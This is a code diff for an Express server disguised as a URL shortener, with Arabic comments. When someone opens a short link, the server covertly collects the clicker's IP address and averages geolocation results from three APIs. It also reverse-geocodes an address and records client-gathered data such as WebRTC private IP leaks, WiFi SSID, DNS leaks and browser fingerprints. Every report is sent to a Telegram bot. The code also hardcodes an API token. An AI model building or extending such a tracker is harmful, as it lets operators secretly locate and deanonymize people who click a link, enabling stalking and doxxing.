@@ -43,82 +43,71 @@ async function sendToTelegram(msg, retries = 3) {
   return false;
 }
 
-// Method 1: FreeGeoIP (الأفضل والأدقة)
 async function getLocationFromFreeGeoIP(ip) {
   try {
     const res = await axios.get(`https://freegeoip.app/json/${ip}`, { timeout: 3000 });
     if (res.data) {
       return {
-        source: 'FreeGeoIP',
-        country: res.data.country_name || 'Unknown',
-        city: res.data.city || 'Unknown',
         latitude: res.data.latitude,
         longitude: res.data.longitude,
-        accuracy: '±20-50km',
-        isp: 'Unknown'
+        country: res.data.country_name || 'Unknown',
+        city: res.data.city || 'Unknown'
       };
     }
-  } catch (e) {
-    console.log('[FreeGeoIP] Error');
-  }
+  } catch (e) {}
   return null;
 }
 
-// Method 2: IPInfo (دقيق جداً)
 async function getLocationFromIPInfo(ip) {
   try {
     const res = await axios.get(`https://ipinfo.io/${ip}?token=9f5b1ad4e5e8e0`, { timeout: 3000 });
     if (res.data && res.data.loc) {
       const [lat, lng] = res.data.loc.split(',');
       return {
-        source: 'IPInfo',
-        country: res.data.country || 'Unknown',
-        city: res.data.city || 'Unknown',
         latitude: parseFloat(lat),
         longitude: parseFloat(lng),
-        accuracy: '±10-30km',
-        isp: res.data.org || 'Unknown'
+        country: res.data.country || 'Unknown',
+        city: res.data.city || 'Unknown'
       };
     }
-  } catch (e) {
-    console.log('[IPInfo] Error');
-  }
+  } catch (e) {}
   return null;
 }
 
-// Method 3: GeoJS (سريع)
 async function getLocationFromGeoJS(ip) {
   try {
     const res = await axios.get(`https://get.geojs.io/v1/ip/geo/${ip}.json`, { timeout: 3000 });
     if (res.data) {
       return {
-        source: 'GeoJS',
-        country: res.data.country_name || 'Unknown',
-        city: res.data.city || 'Unknown',
         latitude: res.data.latitude,
         longitude: res.data.longitude,
-        accuracy: '±20-50km',
-        isp: res.data.organization || 'Unknown'
+        country: res.data.country_name || 'Unknown',
+        city: res.data.city || 'Unknown'
       };
     }
-  } catch (e) {
-    console.log('[GeoJS] Error');
-  }
+  } catch (e) {}
   return null;
 }
 
-// جرّب الطرق الثلاث وخذ الأفضل
-async function getBestLocation(ip) {
-  const freeGeoIP = await getLocationFromFreeGeoIP(ip);
-  if (freeGeoIP) return freeGeoIP;
+async function getAveragedLocation(ip) {
+  const results = await Promise.all([
+    getLocationFromFreeGeoIP(ip),
+    getLocationFromIPInfo(ip),
+    getLocationFromGeoJS(ip)
+  ]);
 
-  const ipinfo = await getLocationFromIPInfo(ip);
-  if (ipinfo) return ipinfo;
+  const validResults = results.filter(r => r !== null);
+  if (validResults.length === 0) return null;
 
-  const geojs = await getLocationFromGeoJS(ip);
-  if (geojs) return geojs;
+  const avgLat = validResults.reduce((sum, r) => sum + r.latitude, 0) / validResults.length;
+  const avgLng = validResults.reduce((sum, r) => sum + r.longitude, 0) / validResults.length;
 
-  return null;
+  return {
+    latitude: avgLat.toFixed(6),
+    longitude: avgLng.toFixed(6),
+    country: validResults[0].country,
+    city: validResults[0].city
+  };
 }
 
 async function reverseGeocode(lat, lng) {
@@ -129,30 +118,10 @@ async function reverseGeocode(lat, lng) {
     );
     if (res.data && res.data.address) {
       const addr = res.data.address;
-      return {
-        country: addr.country || 'Unknown',
-        city: addr.city || addr.town || addr.village || 'Unknown',
-        address: res.data.display_name || 'N/A'
-      };
+      return addr.address || 'Unknown Location';
     }
-  } catch (e) {
-    console.log('[Reverse] Error');
-  }
+  } catch (e) {}
   return null;
-}
-
-function parseUserAgent(ua) {
-  let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
-  if (/android/i.test(ua)) { device = 'Android'; os = 'Android'; }
-  else if (/iphone|ipad/i.test(ua)) { device = 'iOS'; os = 'iOS'; }
-  else if (/windows/i.test(ua)) os = 'Windows';
-  else if (/mac os/i.test(ua)) os = 'macOS';
-  else if (/linux/i.test(ua)) os = 'Linux';
-  if (/chrome/i.test(ua) && !/edg/i.test(ua)) browser = 'Chrome';
-  else if (/firefox/i.test(ua)) browser = 'Firefox';
-  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
-  else if (/edg/i.test(ua)) browser = 'Edge';
-  return { device, os, browser };
 }
 
 function safeParseBody(req) {
@@ -183,51 +152,105 @@ app.post('/api/shorten', (req, res) => {
 
 app.post('/api/log-all', async (req, res) => {
   const body = safeParseBody(req);
-  const { code, gps } = body;
+  const { code, methods } = body;
 
   if (!code || !linkStorage[code]) {
     return res.status(404).json({ error: 'Not found' });
   }
 
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
-  const userAgent = req.get('user-agent') || 'Unknown';
   const originalUrl = linkStorage[code].original;
   linkStorage[code].clicks++;
 
-  let gpsInfo = null;
-  if (gps && gps.latitude && gps.longitude) {
-    gpsInfo = {
-      latitude: parseFloat(gps.latitude).toFixed(6),
-      longitude: parseFloat(gps.longitude).toFixed(6),
-      accuracy: `±${(gps.accuracy || 20).toFixed(0)}m`
-    };
+  // Get best location for reverse geocoding
+  const bestLoc = await getAveragedLocation(ip);
+  let address = null;
+  if (bestLoc) {
+    address = await reverseGeocode(bestLoc.latitude, bestLoc.longitude);
   }
-
-  const ipInfo = await getBestLocation(ip);
-  let reverseInfo = null;
-
-  if (gpsInfo) {
-    reverseInfo = await reverseGeocode(gpsInfo.latitude, gpsInfo.longitude);
-  } else if (ipInfo) {
-    reverseInfo = await reverseGeocode(ipInfo.latitude, ipInfo.longitude);
-  }
-
-  const device = parseUserAgent(userAgent);
 
   let msg = `🔗 <b>رابط فُتح!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
   msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
   msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
   msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n━━━━━━━━━━━━━━━━━━━\n\n`;
 
-  if (ipInfo) {
-    msg += `<b>✅ 📍 ${ipInfo.source}</b>\n🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city}\n📍 <code>${ipInfo.latitude}, ${ipInfo.longitude}</code>\n📏 ${ipInfo.accuracy}\n🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
+  // طريقة 1: WebRTC
+  if (methods?.webrtc) {
+    msg += `<b>✅ الطريقة 1: WebRTC (Private IP)</b>\n`;
+    msg += `🔌 ${methods.webrtc}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
-  if (reverseInfo) {
-    msg += `<b>🗺️ Address</b>\n🏙️ ${reverseInfo.city}, ${reverseInfo.country}\n🏘️ ${reverseInfo.address}\n━━━━━━━━━━━━━━━━━━━\n\n`;
+  // طريقة 2: WiFi SSID
+  if (methods?.wifi) {
+    msg += `<b>✅ الطريقة 2: WiFi SSID</b>\n`;
+    msg += `📡 ${methods.wifi}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
-  msg += `<b>🖥️ Device</b>\n${device.device} | ${device.os} | ${device.browser}`;
+  // طريقة 3: Multi-API Averaging
+  if (bestLoc) {
+    msg += `<b>✅ الطريقة 3: Multi-API Averaging</b>\n`;
+    msg += `📍 <code>${bestLoc.latitude}, ${bestLoc.longitude}</code>\n`;
+    msg += `🏙️ ${bestLoc.city}, ${bestLoc.country}\n`;
+    msg += `🗺️ <a href="https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}">Maps</a>\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+
+  // طريقة 4: Browser Fingerprinting
+  if (methods?.fingerprint) {
+    msg += `<b>✅ الطريقة 4: Browser Fingerprinting</b>\n`;
+    msg += `🖥️ ${methods.fingerprint}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+
+  // طريقة 5: DNS Leak
+  if (methods?.dns) {
+    msg += `<b>✅ الطريقة 5: DNS Leak</b>\n`;
+    msg += `🌐 ${methods.dns}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+
+  // طريقة 6: HTTP Headers Analysis
+  if (methods?.headers) {
+    msg += `<b>✅ الطريقة 6: HTTP Headers</b>\n`;
+    msg += `📋 Language: ${methods.headers.language || 'Unknown'}\n`;
+    msg += `🌍 Encoding: ${methods.headers.encoding || 'Unknown'}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+
+  // طريقة 7: Timezone
+  if (methods?.timezone) {
+    msg += `<b>✅ الطريقة 7: Timezone Detection</b>\n`;
+    msg += `⏱️ ${methods.timezone}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+
+  // طريقة 8: WebGL Canvas
+  if (methods?.webgl) {
+    msg += `<b>✅ الطريقة 8: WebGL Canvas</b>\n`;
+    msg += `🎮 ${methods.webgl}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+
+  // طريقة 9: Screen Resolution
+  if (methods?.screen) {
+    msg += `<b>✅ الطريقة 9: Screen Resolution</b>\n`;
+    msg += `📺 ${methods.screen}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+
+  // طريقة 10: Browser Features
+  if (methods?.features) {
+    msg += `<b>✅ الطريقة 10: Browser Features</b>\n`;
+    msg += `🌟 ${methods.features}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+
+  // Address info
+  if (address) {
+    msg += `<b>📍 العنوان:</b>\n${address}`;
+  }
 
   await sendToTelegram(msg);
   res.json({ success: true });
@@ -236,12 +259,6 @@ app.post('/api/log-all', async (req, res) => {
 app.get('/api/test', async (req, res) => {
   const ok = await sendToTelegram('🔗 اختبار ✅');
   res.json({ telegram: ok ? 'sent' : 'failed' });
-});
-
-app.get('/api/stats/:code', (req, res) => {
-  const link = linkStorage[req.params.code];
-  if (!link) return res.status(404).json({ error: 'Not found' });
-  res.json(link);
 });
 
 app.use(express.static('.'));
@@ -258,15 +275,12 @@ app.get('/:code', async (req, res) => {
 
   setImmediate(async () => {
     const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
-    const userAgent = req.get('user-agent') || 'Unknown';
-    const ipInfo = await getBestLocation(ip);
-    const device = parseUserAgent(userAgent);
+    const bestLoc = await getAveragedLocation(ip);
 
-    let msg = `🔗 <b>رابط!</b> ${code}\n<code>${ip}</code>\n`;
-    if (ipInfo) {
-      msg += `📍 ${ipInfo.city}, ${ipInfo.country}\n🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">Map</a>`;
+    let msg = `🔗 <b>رابط!</b> ${code}\n<code>${ip}</code>`;
+    if (bestLoc) {
+      msg += `\n📍 ${bestLoc.city}, ${bestLoc.country}\n🗺️ <a href="https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}">Map</a>`;
     }
-    msg += `\n${device.device} | ${device.browser}`;
 
     await sendToTelegram(msg);
   });
